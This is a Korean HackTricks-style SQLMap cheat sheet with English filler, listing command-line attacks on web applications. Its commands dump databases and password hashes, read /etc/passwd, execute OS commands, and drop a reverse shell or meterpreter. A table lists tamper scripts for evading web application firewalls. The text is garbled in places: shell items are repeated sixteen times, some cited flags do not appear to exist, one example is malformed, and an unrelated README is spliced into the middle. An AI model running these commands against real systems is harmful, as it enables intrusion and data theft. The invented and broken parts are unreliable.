# SQLMap - Cheetsheat

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **깃허브 저장소에 제출하세요.**

</details>

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**취약점 평가 및 펜테스트를 위한 즉시 사용 가능한 설정**. 20개 이상의 도구 및 기능을 사용하여 어디에서나 전체 펜테스트를 실행할 수 있습니다. 우리는 펜테스터를 대체하지 않습니다 - 대신 펜테스터들에게 깊이 파고들고 쉘을 열고 즐길 시간을 돌려주기 위해 사용자 정의 도구, 탐지 및 공격 모듈을 개발합니다.

{% embed url="https://pentest-tools.com/" %}

## SQLmap을 위한 기본 인수

### 일반적인 인수
```bash
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
```
### 정보 검색

#### 내부
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```
#### DB 데이터

The `--dump` option can be used to retrieve the data from the database. By default, it will dump all the tables in the database. However, you can specify the tables you want to dump using the `--tables` option.

```bash
sqlmap -u "http://example.com/vuln.php?id=1" --dump
```

To dump specific tables, use the `--tables` option followed by the table names separated by a comma.

```bash
sqlmap -u "http://example.com/vuln.php?id=1" --tables users,products
```

You can also use the `--exclude-tables` option to exclude specific tables from being dumped.

```bash
sqlmap -u "http://example.com/vuln.php?id=1" --tables --exclude-tables logs
```

By default, sqlmap will dump the data in CSV format. However, you can specify a different output format using the `--output-format` option. Supported formats include CSV, HTML, JSON, SQL, and XML.

```bash
sqlmap -u "http://example.com/vuln.php?id=1" --dump --output-format=html
```

The dumped data will be saved in a file named `dump.csv` (or the specified output file name) in the current directory.

Note: Dumping data from a database without proper authorization is illegal and unethical. Always ensure you have the necessary permissions before performing any database operations.
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
## 인젝션 위치

### Burp/ZAP 캡처로부터

요청을 캡처하고 req.txt 파일을 생성하세요.
```bash
sqlmap -r req.txt --current-user
```
### GET 요청 삽입

In some cases, you may encounter a web application that uses GET requests to retrieve data from a database. This can be a potential vulnerability if the application does not properly sanitize or validate user input. An attacker can exploit this vulnerability by injecting malicious SQL code into the GET parameters.

In SQL injection attacks, the attacker aims to manipulate the SQL query executed by the application to retrieve unauthorized data or perform unauthorized actions. By injecting SQL code into the GET parameters, the attacker can modify the query's logic and potentially gain access to sensitive information.

To perform a GET request injection, you can use tools like SQLMap. SQLMap is a powerful tool that automates the process of detecting and exploiting SQL injection vulnerabilities. It supports various techniques to bypass filters and retrieve data from the database.

To use SQLMap for GET request injection, you need to provide the vulnerable URL and specify the injection point. SQLMap will then analyze the target and attempt to exploit the SQL injection vulnerability.

Keep in mind that performing SQL injection attacks without proper authorization is illegal and unethical. Always ensure that you have permission from the target system's owner before conducting any penetration testing activities.
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
### POST 요청 삽입

In some cases, the target application may use POST requests to send data to the server. SQL injection can also be performed on these POST requests. SQLMap provides options to specify the POST data and the injection point.

In order to perform a POST request injection, you need to provide the target URL, the POST data, and the injection point. The injection point can be specified using the `--data` option followed by the parameter name and the payload.

For example, let's say the target URL is `http://example.com/login.php` and the POST data is `username=admin&password=pass`. If the injection point is the `username` parameter, you can use the following command:

```
sqlmap -u "http://example.com/login.php" --data "username=admin&password=pass" --data="username" --level=5 --risk=3
```

This command tells SQLMap to perform a POST request injection on the `username` parameter with a detection level of 5 and a risk level of 3.

SQLMap will automatically detect the injection point and try different payloads to exploit the vulnerability. It will then provide you with the results of the injection, including any retrieved data or potential vulnerabilities.

Remember to always use SQLMap responsibly and with proper authorization. Unauthorized use of SQLMap or any other hacking tool is illegal and unethical.
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
### 헤더 및 기타 HTTP 메소드에서의 인젝션

In addition to injecting payloads in the URL parameters, SQL injection can also occur in the headers and other HTTP methods. This can be exploited by manipulating the values in the headers or by injecting payloads in the body of the request.

#### Header Injection

Header injection occurs when an attacker is able to inject malicious content into the headers of an HTTP request. This can be done by manipulating the values of the headers, such as the `User-Agent` or `Referer` headers.

To test for header injection, you can use tools like `sqlmap` to inject payloads in the headers and observe the response from the server. By injecting payloads in the headers, an attacker can potentially manipulate the behavior of the server or extract sensitive information.

#### Other HTTP Methods

SQL injection can also occur in other HTTP methods, such as `POST`, `PUT`, `DELETE`, etc. In these cases, the payloads are injected in the body of the request instead of the URL parameters.

To test for SQL injection in other HTTP methods, you can use tools like `sqlmap` to inject payloads in the body of the request and observe the response from the server. By injecting payloads in the body, an attacker can potentially manipulate the database queries and extract or modify data.

It is important to thoroughly test for SQL injection in all parts of an application, including the headers and other HTTP methods, to ensure the security of the system.
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
### SQL Injection이 성공했을 때 문자열 표시하기

When performing SQL Injection attacks, it is important to determine whether the injection was successful or not. One way to do this is by indicating a specific string that will be displayed when the injection is successful.

To achieve this, you can use the `--string` option in SQLMap. This option allows you to specify a string that should be present in the response when the injection is successful.

Here is an example command that demonstrates the usage of the `--string` option:

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --string "Injection Successful"
```

In this example, SQLMap will send requests to the specified URL with the payload for SQL Injection. If the response contains the string "Injection Successful", SQLMap will consider the injection to be successful.

By indicating a specific string, you can automate the process of identifying successful injections and focus on exploiting the vulnerability further.
```bash
--string="string_showed_when_TRUE"
```
### Eval

**Sqlmap**은 각 페이로드를 보내기 전에 일부 파이썬 원라이너로 처리하기 위해 `-e` 또는 `--eval`을 사용할 수 있습니다. 이를 통해 페이로드를 보내기 전에 사용자 정의 방식으로 페이로드를 처리하는 것이 매우 쉽고 빠릅니다. 다음 예제에서는 **flask 쿠키 세션**이 **알려진 비밀로 flask에 의해 서명된 후에 보내집니다**:
```bash
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```
### 쉘

SQLMap은 쉘을 획득하기 위해 다양한 방법을 제공합니다. 이 섹션에서는 SQLMap을 사용하여 쉘을 얻는 방법에 대해 설명합니다.

#### 1. OS Shell

SQLMap은 명령어를 실행하기 위해 명령 프롬프트 또는 터미널을 사용할 수 있습니다. 이를 통해 원격 시스템에서 명령어를 실행하고 결과를 확인할 수 있습니다.

```bash
$ sqlmap -u "http://example.com/vuln.php?id=1" --os-shell
```

#### 2. SQL Shell

SQLMap은 데이터베이스에 대한 SQL 쿼리를 실행하기 위한 쉘을 제공합니다. 이를 통해 데이터베이스에 직접 접근하여 데이터를 조작하거나 추출할 수 있습니다.

```bash
$ sqlmap -u "http://example.com/vuln.php?id=1" --sql-shell
```

#### 3. File System Shell

SQLMap은 파일 시스템에 대한 쉘을 제공합니다. 이를 통해 원격 시스템의 파일을 탐색하고 다운로드할 수 있습니다.

```bash
$ sqlmap -u "http://example.com/vuln.php?id=1" --file-shell
```

#### 4. OS Command Execution

SQLMap은 원격 시스템에서 임의의 명령어를 실행할 수 있는 기능을 제공합니다. 이를 통해 시스템 명령어를 실행하고 결과를 확인할 수 있습니다.

```bash
$ sqlmap -u "http://example.com/vuln.php?id=1" --os-cmd
```

#### 5. OS File Read

SQLMap은 원격 시스템에서 파일을 읽을 수 있는 기능을 제공합니다. 이를 통해 원격 시스템의 파일을 읽고 그 내용을 확인할 수 있습니다.

```bash
$ sqlmap -u "http://example.com/vuln.php?id=1" --file-read
```

#### 6. OS File Write

SQLMap은 원격 시스템에 파일을 작성할 수 있는 기능을 제공합니다. 이를 통해 원격 시스템에 파일을 생성하거나 수정할 수 있습니다.

```bash
$ sqlmap -u "http://example.com/vuln.php?id=1" --file-write
```

#### 7. OS File Upload

SQLMap은 원격 시스템에 파일을 업로드할 수 있는 기능을 제공합니다. 이를 통해 원격 시스템에 악성 파일을 전송할 수 있습니다.

```bash
$ sqlmap -u "http://example.com/vuln.php?id=1" --file-dest
```

#### 8. OS File Download

SQLMap은 원격 시스템에서 파일을 다운로드할 수 있는 기능을 제공합니다. 이를 통해 원격 시스템의 파일을 로컬 시스템으로 전송할 수 있습니다.

```bash
$ sqlmap -u "http://example.com/vuln.php?id=1" --file-download
```

#### 9. OS Shell via SQL Injection

SQLMap은 SQL 삽입을 통해 쉘을 얻을 수 있는 기능을 제공합니다. 이를 통해 원격 시스템에서 명령어를 실행하고 결과를 확인할 수 있습니다.

```bash
$ sqlmap -u "http://example.com/vuln.php?id=1" --os-shell
```

#### 10. SQL Shell via SQL Injection

SQLMap은 SQL 삽입을 통해 데이터베이스에 대한 SQL 쉘을 얻을 수 있는 기능을 제공합니다. 이를 통해 데이터베이스에 직접 접근하여 데이터를 조작하거나 추출할 수 있습니다.

```bash
$ sqlmap -u "http://example.com/vuln.php?id=1" --sql-shell
```

#### 11. File System Shell via SQL Injection

SQLMap은 SQL 삽입을 통해 파일 시스템에 대한 쉘을 얻을 수 있는 기능을 제공합니다. 이를 통해 원격 시스템의 파일을 탐색하고 다운로드할 수 있습니다.

```bash
$ sqlmap -u "http://example.com/vuln.php?id=1" --file-shell
```

#### 12. OS Command Execution via SQL Injection

SQLMap은 SQL 삽입을 통해 원격 시스템에서 임의의 명령어를 실행할 수 있는 기능을 제공합니다. 이를 통해 시스템 명령어를 실행하고 결과를 확인할 수 있습니다.

```bash
$ sqlmap -u "http://example.com/vuln.php?id=1" --os-cmd
```

#### 13. OS File Read via SQL Injection

SQLMap은 SQL 삽입을 통해 원격 시스템에서 파일을 읽을 수 있는 기능을 제공합니다. 이를 통해 원격 시스템의 파일을 읽고 그 내용을 확인할 수 있습니다.

```bash
$ sqlmap -u "http://example.com/vuln.php?id=1" --file-read
```

#### 14. OS File Write via SQL Injection

SQLMap은 SQL 삽입을 통해 원격 시스템에 파일을 작성할 수 있는 기능을 제공합니다. 이를 통해 원격 시스템에 파일을 생성하거나 수정할 수 있습니다.

```bash
$ sqlmap -u "http://example.com/vuln.php?id=1" --file-write
```

#### 15. OS File Upload via SQL Injection

SQLMap은 SQL 삽입을 통해 원격 시스템에 파일을 업로드할 수 있는 기능을 제공합니다. 이를 통해 원격 시스템에 악성 파일을 전송할 수 있습니다.

```bash
$ sqlmap -u "http://example.com/vuln.php?id=1" --file-dest
```

#### 16. OS File Download via SQL Injection

SQLMap은 SQL 삽입을 통해 원격 시스템에서 파일을 다운로드할 수 있는 기능을 제공합니다. 이를 통해 원격 시스템의 파일을 로컬 시스템으로 전송할 수 있습니다.

```bash
$ sqlmap -u "http://example.com/vuln.php?id=1" --file-download
```
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
### 파일 읽기

`--file-read` 옵션을 사용하여 SQL 쿼리를 통해 파일을 읽을 수 있습니다. 이를 통해 데이터베이스 서버에 저장된 파일의 내용을 확인할 수 있습니다.

#### 사용법

```
sqlmap -u "http://example.com/vuln.php?id=1" --file-read="/etc/passwd"
```

위의 예시에서는 `http://example.com/vuln.php?id=1`에 대한 SQL 쿼리를 실행하여 `/etc/passwd` 파일의 내용을 읽습니다.

#### 주의사항

- 파일을 읽기 위해서는 데이터베이스 서버에 파일이 저장되어 있어야 합니다.
- 파일 경로는 데이터베이스 서버의 파일 시스템 경로여야 합니다.
- 파일을 읽을 수 있는 권한이 필요합니다.
- 파일이 너무 크면 응답 시간이 길어질 수 있습니다.
```bash
--file-read=/etc/passwd
```
### SQLmap을 사용하여 웹사이트 크롤링 및 자동으로 취약점 공격하기

SQLmap is a powerful tool for automating SQL injection attacks. In addition to exploiting SQL injection vulnerabilities, it can also be used to crawl a website and discover additional injection points. This can be useful for identifying potential targets for further exploitation.

To crawl a website with SQLmap, you can use the `--crawl` option followed by the depth of the crawl. For example, to crawl a website up to a depth of 3, you would use the following command:

```
sqlmap -u <target_url> --crawl=3
```

SQLmap will then crawl the website, automatically identifying and testing for SQL injection vulnerabilities. It will also attempt to exploit any vulnerabilities it finds.

During the crawl, SQLmap will collect information about the website's structure, such as the available parameters and their corresponding values. This information can be useful for further exploitation.

Once the crawl is complete, SQLmap will generate a report detailing the vulnerabilities it discovered and the exploitation attempts it made. This report can be found in the `sqlmapoutput` directory.

It is important to note that crawling a website with SQLmap can be resource-intensive and time-consuming. Therefore, it is recommended to use this technique responsibly and with proper authorization.

By combining the crawling feature of SQLmap with its automated exploitation capabilities, you can efficiently identify and exploit SQL injection vulnerabilities in a web application.
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
### 두 번째 순서 인젝션

Second Order Injection은 웹 응용 프로그램에서 발생하는 취약점 중 하나로, 사용자 입력을 처리하는 과정에서 발생할 수 있습니다. 이 취약점은 입력을 처리하는 단계에서 적절한 필터링 또는 검증이 이루어지지 않아 공격자가 악의적인 SQL 쿼리를 삽입할 수 있는 가능성을 제공합니다.

이러한 취약점을 악용하기 위해 공격자는 일반적으로 첫 번째 요청에서는 취약점을 찾아내고, 두 번째 요청에서 실제로 공격을 수행합니다. 첫 번째 요청에서는 취약점을 확인하기 위해 일반적인 SQL 인젝션 기술을 사용하며, 두 번째 요청에서는 실제로 데이터베이스에 악의적인 쿼리를 삽입하여 공격을 수행합니다.

두 번째 순서 인젝션은 공격자가 데이터베이스에 대한 권한을 획득하거나 데이터베이스의 기밀 정보를 노출시킬 수 있는 심각한 보안 위협입니다. 따라서 웹 응용 프로그램을 개발하거나 평가하는 과정에서 두 번째 순서 인젝션 취약점을 확인하고 적절한 대응 방안을 마련해야 합니다.
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
[**이 게시물을 읽으세요**](second-order-injection-sqlmap.md)**. sqlmap을 사용하여 간단하고 복잡한 2차 순서 인젝션을 수행하는 방법에 대해 알아보세요.**

## 인젝션 사용자 정의하기

### 접미사 설정하기
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
### 접두사

---

### Description

---

### 설명

---

This directory contains files related to SQL injection attacks using the tool SQLMap. SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities in web applications.

이 디렉토리에는 SQLMap 도구를 사용한 SQL 인젝션 공격과 관련된 파일이 포함되어 있습니다. SQLMap은 웹 애플리케이션에서 SQL 인젝션 취약점을 탐지하고 악용하는 과정을 자동화하는 오픈 소스 펜테스팅 도구입니다.

---

### Files

---

### 파일

---

- `basic.md`: This file provides a basic introduction to SQL injection and how to use SQLMap for testing.

- `basic.md`: 이 파일은 SQL 인젝션에 대한 기본적인 소개와 테스트를 위해 SQLMap을 사용하는 방법을 제공합니다.

- `advanced.md`: This file covers advanced techniques and features of SQLMap, including tampering payloads, evasion techniques, and more.

- `advanced.md`: 이 파일은 SQLMap의 고급 기술과 기능을 다루며, 페이로드 조작, 회피 기술 등을 포함합니다.

- `cheatsheet.md`: This file contains a cheatsheet with commonly used SQLMap commands and options.

- `cheatsheet.md`: 이 파일에는 일반적으로 사용되는 SQLMap 명령과 옵션을 포함한 치트시트가 있습니다.

---

### Usage

---

### 사용법

---

To use SQLMap, you need to have Python installed on your system. You can download Python from the official website: [https://www.python.org/downloads/](https://www.python.org/downloads/)

SQLMap을 사용하려면 시스템에 Python이 설치되어 있어야 합니다. Python은 공식 웹사이트([https://www.python.org/downloads/](https://www.python.org/downloads/))에서 다운로드할 수 있습니다.

Once you have Python installed, you can clone the SQLMap repository from GitHub using the following command:

Python을 설치한 후에는 다음 명령을 사용하여 GitHub에서 SQLMap 저장소를 복제할 수 있습니다.

```
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap
```

---

### References

---

### 참고 자료

---

- SQLMap GitHub repository: [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)

- SQLMap GitHub 저장소: [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
### 불리언 인젝션 찾는 방법 도움말

Boolean-based SQL injection은 웹 응용 프로그램에서 발생하는 일반적인 취약점 중 하나입니다. 이 취약점을 이용하여 데이터베이스에 대한 정보를 추출하거나 조작할 수 있습니다. SQLMap은 불리언 인젝션을 찾는 데 도움이 되는 강력한 도구입니다.

불리언 인젝션을 찾기 위해 SQLMap을 사용하는 방법은 다음과 같습니다:

1. SQLMap을 설치하고 실행합니다.
2. 명령줄에서 다음 명령을 입력하여 SQLMap을 실행합니다.

   ```
   sqlmap -u <URL> --technique=B --level=<level> --risk=<risk>
   ```

   여기서 `<URL>`은 대상 웹 응용 프로그램의 URL입니다. `<level>`과 `<risk>`는 SQLMap의 레벨과 위험도를 나타내는 매개 변수입니다. 이러한 매개 변수를 조정하여 적절한 불리언 인젝션 검색 설정을 선택할 수 있습니다.

3. SQLMap은 자동으로 불리언 인젝션을 찾기 위해 대상 웹 응용 프로그램을 분석합니다. 가능한 인젝션 포인트를 식별하고 적절한 페이로드를 사용하여 불리언 기반의 SQL 인젝션을 시도합니다.

4. SQLMap은 결과를 통해 불리언 인젝션 취약점을 식별하고, 데이터베이스에 대한 정보를 추출하거나 조작할 수 있는지 여부를 확인합니다.

불리언 인젝션을 찾는 것은 웹 응용 프로그램의 보안을 강화하는 데 중요합니다. SQLMap을 사용하여 불리언 인젝션을 검색하고 취약점을 해결하는 것은 웹 응용 프로그램의 보안을 향상시키는 데 도움이 됩니다.
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
### Tamper

기억하세요, **파이썬으로 직접 탬퍼를 만들 수 있다는 것**을. 아주 간단합니다. [여기](second-order-injection-sqlmap.md)에서 탬퍼 예제를 찾을 수 있습니다.
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper                       | 설명                                                                                                                               |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| apostrophemask.py            | 아포스트로피 문자를 UTF-8 전체 너비의 대응 문자로 대체합니다.                                                                         |
| apostrophenullencode.py      | 아포스트로피 문자를 불법적인 이중 유니코드 대응 문자로 대체합니다.                                                                     |
| appendnullbyte.py            | 페이로드의 끝에 인코딩된 NULL 바이트 문자를 추가합니다.                                                                               |
| base64encode.py              | 주어진 페이로드의 모든 문자를 Base64로 인코딩합니다.                                                                                  |
| between.py                   | '>' 연산자를 'NOT BETWEEN 0 AND #'로 대체합니다.                                                                                     |
| bluecoat.py                  | SQL 문 뒤의 공백 문자를 유효한 무작위 공백 문자로 대체합니다. 그 후 문자 '='를 LIKE 연산자로 대체합니다.                             |
| chardoubleencode.py          | 주어진 페이로드의 모든 문자를 이중 URL 인코딩합니다. (이미 인코딩된 문자는 처리하지 않음)                                               |
| commalesslimit.py            | 'LIMIT M, N'과 같은 인스턴스를 'LIMIT N OFFSET M'으로 대체합니다.                                                                     |
| commalessmid.py              | 'MID(A, B, C)'와 같은 인스턴스를 'MID(A FROM B FOR C)'로 대체합니다.                                                                  |
| concat2concatws.py           | 'CONCAT(A, B)'와 같은 인스턴스를 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'로 대체합니다.                                                  |
| charencode.py                | 주어진 페이로드의 모든 문자를 URL 인코딩합니다. (이미 인코딩된 문자는 처리하지 않음)                                                     |
| charunicodeencode.py         | 주어진 페이로드의 인코딩되지 않은 문자를 유니코드 URL 인코딩합니다. (이미 인코딩된 문자는 처리하지 않음) "%u0022"                      |
| charunicodeescape.py         | 주어진 페이로드의 인코딩되지 않은 문자를 유니코드 URL 인코딩합니다. (이미 인코딩된 문자는 처리하지 않음) "\u0022"                      |
| equaltolike.py               | 모든 등호 연산자('=')를 'LIKE' 연산자로 대체합니다.                                                                                    |
| escapequotes.py              | 따옴표('와 ")를 슬래시로 이스케이프합니다.                                                                                           |
| greatest.py                  | '>' 연산자를 'GREATEST' 대응 문자로 대체합니다.                                                                                      |
| halfversionedmorekeywords.py | 각 키워드 앞에 버전별 MySQL 주석을 추가합니다.                                                                                      |
| ifnull2ifisnull.py           | 'IFNULL(A, B)'와 같은 인스턴스를 'IF(ISNULL(A), B, A)'로 대체합니다.                                                                  |
| modsecurityversioned.py      | 버전별 주석으로 완전한 쿼리를 감싸줍니다.                                                                                           |
| modsecurityzeroversioned.py  | 제로 버전별 주석으로 완전한 쿼리를 감싸줍니다.                                                                                      |
| multiplespaces.py            | SQL 키워드 주변에 여러 개의 공백을 추가합니다.                                                                                      |
| nonrecursivereplacement.py   | 미리 정의된 SQL 키워드를 대체할 수 있는 표현으로 대체합니다. (예: .replace("SELECT", "")) 필터링합니다.                                |
| percentage.py                | 각 문자 앞에 백분율 기호(%)를 추가합니다.                                                                                          |
| overlongutf8.py              | 주어진 페이로드의 모든 문자를 변환합니다. (이미 인코딩된 문자는 처리하지 않음)                                                         |
| randomcase.py                | 각 키워드 문자를 무작위 대소문자 값으로 대체합니다.                                                                                  |
| randomcomments.py            | SQL 키워드에 무작위 주석을 추가합니다.                                                                                              |
| securesphere.py              | 특수 제작된 문자열을 추가합니다.                                                                                                    |
| sp\_password.py              | 페이로드 끝에 'sp\_password'를 추가하여 DBMS 로그에서 자동으로 난독화합니다.                                                           |
| space2comment.py             | 공백 문자(' ')를 주석으로 대체합니다.                                                                                               |
| space2dash.py                | 공백 문자(' ')를 대시 주석('--')로 대체한 후 무작위 문자열과 새 줄('\n')이 이어집니다.                                                  |
| space2hash.py                | 공백 문자(' ')를 파운드 문자('#')로 대체한 후 무작위 문자열과 새 줄('\n')이 이어집니다.                                                  |
| space2morehash.py            | 공백 문자(' ')를 파운드 문자('#')로 대체한 후 무작위 문자열과 새 줄('\n')이 이어집니다.                                                  |
| space2mssqlblank.py          | 공백 문자(' ')를 유효한 대체 문자 집합에서 무작위 공백 문자로 대체합니다.                                                               |
| space2mssqlhash.py           | 공백 문자(' ')를 파운드 문자('#')로 대체한 후 새 줄('\n')이 이어집니다.                                                               |
| space2mysqlblank.py          | 공백 문자(' ')를 유효한 대체 문자 집합에서 무작위 공백 문자로 대체합니다.                                                               |
| space2mysqldash.py           | 공백 문자(' ')를 대시 주석('--')로 대체한 후 새 줄('\n')이 이어집니다.                                                                 |
| space2plus.py                | 공백 문자(' ')를 플러스 기호('+')로 대체합니다.                                                                                      |
| space2randomblank.py         | 공백 문자(' ')를 유효한 대체 문자 집합에서 무작위 공백 문자로 대체합니다.                                                               |
| symboliclogical.py           | AND 및 OR 논리 연산자를 기호 대응 문자로 대체합니다. (&& 및 \|)                                                                       |
| unionalltounion.py           | UNION ALL SELECT를 UNION SELECT로 대체합니다.                                                                                       |
| unmagicquotes.py             | 따옴표(')를 다중 바이트 조합 %bf%27로 대체하고 끝에 일반 주석을 추가하여 작동하도록 합니다.                                            |
| uppercase.py                 | 각 키워드 문자를 대문자 값 'INSERT'로 대체합니다.                                                                                    |
| varnish.py                   | HTTP 헤더 'X-originating-IP'를 추가합니다.                                                                                          |
| versionedkeywords.py         | 각 비 함수 키워드를 버전별 MySQL 주석으로 감싸줍니다.                                                                                 |
| versionedmorekeywords.py     | 각 키워드를 버전별 MySQL 주석으로 감싸줍니다.                                                                                        |
| xforwardedfor.py             | 가짜 HTTP 헤더 'X-Forwarded-For'를 추가합니다.                                                                                      |

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**취약점 평가 및 펜테스트를 위한 즉시 사용 가능한 설정**. 20개 이상의 도구 및 기능으로 어디에서나 전체 펜테스트를 실행하십시오. 리콘(Recon)부터 보고서 작성까지. 우리는 펜테스터를 대체하지 않습니다 - 그들에게 깊이 파고들고, 쉘을 팝하고, 즐거움을 느낄 수 있도록 사용자 정의 도구, 탐지 및 공격 모듈을 개발합니다.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 AWS 해킹을 전문가 수준까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**
